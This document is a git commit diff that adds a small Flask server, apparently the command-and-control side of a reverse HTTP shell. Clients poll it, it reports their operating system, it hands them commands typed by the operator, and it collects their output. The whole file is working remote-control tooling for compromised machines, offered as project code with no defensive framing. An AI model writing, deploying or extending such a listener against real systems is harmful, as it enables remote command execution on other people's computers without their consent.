590a57f16ff53cbe20bcc15e300ba54ffc6d3402
Ashish D'Souza <sudouser512@gmail.com>
2020-08-04 03:01:20 -0400

    Create basic api structure

--- src/server/flask/api.py
+++ src/server/flask/api.py
@@ -1,2 +1,31 @@
 #!/usr/bin/python3
 # api.py
+
+import os
+from flask import Flask, request
+
+
+app = Flask(__name__)
+
+
+@app.route('/reverse_http_shell/', methods=['GET'])
+def get_reverse_http_shell():
+    if not request.args.get('ready'):
+        if 'windows' in str(request.user_agent).lower():
+            return 'Windows', 200
+        elif 'linux' in str(request.user_agent).lower():
+            return 'Linux', 200
+        else:
+            return 'Unknown operating system', 400
+    return input('Command'), 200
+
+
+@app.route('/reverse_http_shell/', methods=['POST'])
+def post_reverse_http_shell():
+    if request.form.get('stdout'):
+        print(request.form.get('stdout'))
+    return 'ok', 200
+
+
+if __name__ == '__main__':
+    app.run('0.0.0.0', 80)
